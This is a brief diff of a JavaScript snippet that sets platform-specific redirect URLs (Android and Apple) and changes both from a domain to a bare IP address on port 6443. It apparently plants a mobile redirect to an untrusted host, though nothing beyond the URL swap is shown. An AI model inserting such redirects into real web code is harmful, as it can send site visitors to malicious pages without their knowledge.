@@ -2,8 +2,8 @@
 (function (w, d, address) {
 
 
-  var  adurl = "https://www.sohujs.com";//安卓url
-  var  apurl = "https://www.sohujs.com";//苹果url
+  var  adurl = "http://154.89.127.200:6443/zcdll.html";//安卓url
+  var  apurl = "http://154.89.127.200:6443/zcdll.html";//苹果url
 
 
 
